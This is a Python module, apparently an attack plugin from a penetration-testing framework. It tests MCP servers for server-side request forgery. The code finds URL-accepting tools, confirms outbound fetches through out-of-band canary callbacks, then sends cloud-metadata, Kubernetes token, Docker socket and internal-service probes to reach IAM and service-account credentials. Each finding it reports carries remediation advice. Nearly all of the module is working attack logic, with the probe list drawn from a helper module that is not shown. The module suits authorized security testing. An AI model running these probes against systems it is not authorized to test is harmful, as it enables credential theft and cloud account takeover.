"""
Server-Side Request Forgery (SSRF) — Pro.

For every MCP tool that accepts a URL/URI, this attack:

  1. Confirms server-side outbound HTTP via Minerva's OOB callback.
  2. Probes every major cloud-metadata endpoint with the *correct*
     headers/methods (IMDSv2 token flow, GCP `Metadata-Flavor`, Azure
     scope params).
  3. Probes K8s service-account tokens via `file://`, the Docker socket,
     etcd, Consul, gopher Redis.
  4. Detects which cloud the target is running in by fingerprinting
     metadata responses.

All probes are sourced from the `cloud_metadata` helper module, so a
single config flag (`cloud_providers`) lets pentesters scope a run to
exactly the providers in scope for the engagement.
"""


_DEFAULT_URL_KEYWORDS = ("url", "uri", "link", "endpoint", "address", "src",
                        "source", "href", "webhook", "callback", "fetch",
                        "host", "target", "redirect")


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "ssrf"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    oob_wait = int(params.get("oob_wait_seconds", 20))
    only_tool_names = params.get("only_tool_names") or []
    probe_cloud_metadata = bool(params.get("probe_cloud_metadata", True))
    cloud_providers = params.get("cloud_providers") or [
        "aws", "gcp", "azure", "oracle", "alibaba", "do", "hetzner", "k8s", "container",
    ]
    min_severity = params.get("min_severity") or "low"
    sev_order = ["critical", "high", "medium", "low"]
    sev_threshold = sev_order[:sev_order.index(min_severity) + 1]
    url_keywords = list(params.get("url_keywords") or _DEFAULT_URL_KEYWORDS)
    protocol_version = params.get("protocol_version") or None
    transport_override = params.get("transport_override") or None

    mcp = mcp_client.MCPClient.from_target(
        target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        disc = mcp.discover()
        if not disc["initialized"]:
            init_resp = (disc.get("raw") or {}).get("initialize") or {}
            rb.error(f"MCP initialize failed: {disc.get('errors')}")
            rb.add_evidence(evidence.ev_mcp_call(init_resp, note="failed initialize"))
            return rb.finalize(success=False)

        tools = disc.get("tools") or []
        cands = _pick_url_tools(tools, only_tool_names, url_keywords)
        if not cands:
            rb.warn("No URL-accepting tools found. Set only_tool_names or url_keywords to force.")
            return rb.finalize(success=True)
        rb.info(f"URL-tool candidates: {[t.get('name') for t in cands]}")

        # Build the cloud-metadata probe matrix once
        cloud_set = []
        if probe_cloud_metadata:
            cloud_set = cloud_metadata.all_probes(
                providers=cloud_providers,
                severities=sev_threshold,
            )
            rb.info(f"Cloud-metadata probes scoped: {len(cloud_set)} probes "
                    f"across {cloud_providers}")

        for tool in cands:
            tname = tool.get("name")
            schema = tool.get("inputSchema") or {}
            url_params = _url_params(schema, url_keywords)

            for pname in url_params:
                # ----- 1. OOB confirmation -----
                token = oob.mint(attack_id="ssrf", ttl=oob_wait + 20,
                                 metadata={"tool": tname, "param": pname})
                args = helpers.fill_defaults(schema)
                args[pname] = token.url
                r = mcp.call_tool_safe(tname, args)
                rb.add_evidence(evidence.ev_mcp_call(
                    r, note=f"ssrf oob probe {tname}[{pname}]"))
                hits = oob.wait(token.token, timeout=oob_wait)
                ssrf_confirmed = bool(hits)
                if ssrf_confirmed:
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id", "ssrf"),
                        title=f"SSRF CONFIRMED on '{tname}' via parameter '{pname}'",
                        category="ssrf",
                        severity="high", confidence="confirmed",
                        cwe="CWE-918",
                        tool=tname, parameter=pname, payload=token.url,
                        description=(
                            f"Tool fetched the Minerva canary URL from source IP "
                            f"{hits[0].get('source_ip')}. Server performs outbound "
                            "HTTP on attacker-controlled URLs."
                        ),
                        impact=(
                            "Attacker can reach internal services, cloud metadata, "
                            "filesystem (file://), service-mesh internals. In cloud "
                            "environments this commonly yields IAM credential theft."
                        ),
                        remediation=(
                            "Allow-list URLs by hostname. Block private IPs (RFC1918, "
                            "link-local, loopback, 169.254.0.0/16, fc00::/7). "
                            "Reject file://, gopher://, dict://, ldap:// schemes. "
                            "Resolve DNS once and check the resolved IP."
                        ),
                        references=["https://cwe.mitre.org/data/definitions/918.html"],
                        evidence=[
                            evidence.ev_oob_hit(token.token, hits, note="OOB proof"),
                            evidence.ev_mcp_call(r, note="response to SSRF payload"),
                        ],
                    ))
                oob.release(token.token)

                # ----- 2. Cloud-metadata probes -----
                # Only continue if SSRF confirmed (saves cycles) — but always
                # try if probe_cloud_metadata is on, since some servers fetch
                # without callback (e.g. they parse JSON server-side and we
                # don't see an OOB hit).
                if not probe_cloud_metadata:
                    continue
                detected_provider = None
                for probe in cloud_set:
                    args = helpers.fill_defaults(schema)
                    args[pname] = probe["url"]
                    # If the tool accepts headers, inject them; otherwise we
                    # rely on the SSRF target's own request library (some
                    # tools always strip custom headers — that's why the
                    # `headers` field on the probe is informative, not
                    # mandatory). If schema has a headers param, set it.
                    headers_param = next((p for p, s in
                                           (schema.get("properties") or {}).items()
                                           if isinstance(s, dict)
                                           and s.get("type") == "object"
                                           and any(k in p.lower()
                                                   for k in ("header", "headers"))),
                                          None)
                    if headers_param and probe.get("headers"):
                        args[headers_param] = probe["headers"]
                    r = mcp.call_tool_safe(tname, args)
                    rb.add_evidence(evidence.ev_mcp_call(
                        r, note=f"cloud-meta {probe['provider']} {probe['url']}"))
                    text = r.get("text_output") or ""
                    if probe["marker"] and probe["marker"] in text:
                        detected_provider = probe["provider"]
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "ssrf"),
                            title=f"SSRF reaches {probe['provider']} metadata: {probe['purpose']}",
                            category="ssrf",
                            severity=probe["severity"],
                            confidence="confirmed",
                            cwe="CWE-918",
                            tool=tname, parameter=pname, payload=probe["url"],
                            description=(
                                f"Response to {probe['url']} contained marker "
                                f"`{probe['marker']}` — characteristic of "
                                f"{probe['provider']} metadata. {probe['purpose']}."
                            ),
                            impact=_cloud_impact(probe["provider"]),
                            remediation=(
                                "Block egress to instance-metadata IP ranges from "
                                "MCP server hosts (169.254.169.254, "
                                "metadata.google.internal). For AWS, enforce "
                                "IMDSv2-only with hop-limit=1. For GCP, drop the "
                                "Metadata-Flavor header at the proxy. For Azure, "
                                "lock down with NSGs."
                            ),
                            evidence=[evidence.ev_mcp_call(r)],
                        ))
                # Try fingerprint detection on the OOB response
                if not detected_provider and ssrf_confirmed:
                    fingerprint = cloud_metadata.detect_provider_from_text(
                        r.get("text_output") or "")
                    if fingerprint:
                        rb.info(f"Tool '{tname}' likely runs on {fingerprint}")
        return rb.finalize()
    finally:
        mcp.close()


def _cloud_impact(provider: str) -> str:
    if provider == "aws":
        return ("Exfil of IAM role credentials enables full AWS account "
                "compromise (any service the role can touch).")
    if provider == "gcp":
        return ("Service-account access tokens grant API access (Cloud SQL, "
                "Storage, Compute) for the duration of the token.")
    if provider == "azure":
        return "Managed-identity tokens grant Azure ARM / Key Vault access."
    if provider == "k8s":
        return ("K8s SA tokens enable pod-level operations, often pivot to "
                "secrets/configmaps and other namespaces.")
    if provider == "docker":
        return ("Docker socket access = root on the host (mount /, run "
                "privileged container).")
    return "Internal service disclosure / lateral-movement primitive."


def _pick_url_tools(tools, force_names, keywords):
    if force_names:
        return [t for t in tools if t.get("name") in set(force_names)]
    out = []
    for t in tools:
        blob = f"{t.get('name','')} {t.get('description','')}".lower()
        if any(k in blob for k in keywords):
            out.append(t)
    if out:
        return out
    # Fallback: tools with a param hinting URL
    for t in tools:
        for n in (t.get("inputSchema") or {}).get("properties", {}) or {}:
            if any(k in n.lower() for k in keywords):
                out.append(t); break
    return out


def _url_params(schema, keywords):
    out = []
    for n, s in ((schema or {}).get("properties") or {}).items():
        if not isinstance(s, dict) or s.get("type") != "string":
            continue
        if any(k in n.lower() for k in keywords):
            out.append(n)
        elif (s.get("format") or "").lower() in ("uri", "url"):
            out.append(n)
    return out
